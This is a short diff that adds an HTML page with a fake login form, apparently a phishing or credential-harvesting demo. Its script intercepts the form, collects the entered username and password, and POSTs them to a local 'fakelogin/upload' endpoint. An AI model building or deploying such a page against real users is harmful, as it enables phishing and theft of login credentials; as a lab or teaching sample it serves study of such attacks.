@@ -1,0 +1,31 @@
+<html>
+    <head>
+        <script>
+            window.addEventListener("DOMContentLoaded", function(){
+                document.getElementById("myForm").onsubmit = function(event) {
+                    event.preventDefault();
+                    var userAndPassword = {
+                        user: document.getElementById("username").value,
+                        password: document.getElementById("password").value
+                    }
+                    console.log("collected: ",userAndPassword);
+                    var xhttp = new XMLHttpRequest();
+                    xhttp.onreadystatechange = function() {
+                        if (this.readyState == 4 && this.status == 200) {
+                            console.log("sent: "+userAndPassword);
+                        }
+                    };
+                    xhttp.open("POST", "http://localhost/fakelogin/upload", true);
+                    xhttp.send(userAndPassword);
+                }
+            });
+        </script>
+    </head>
+    <body>
+        <form id="myForm">
+            UserName<input id="username" name="username" type="text"/><br/>
+            Password<input id="password" name="password" type="password"/><br/>
+            <input type="submit" value="Login">
+        </form>
+    </body>
+</html>
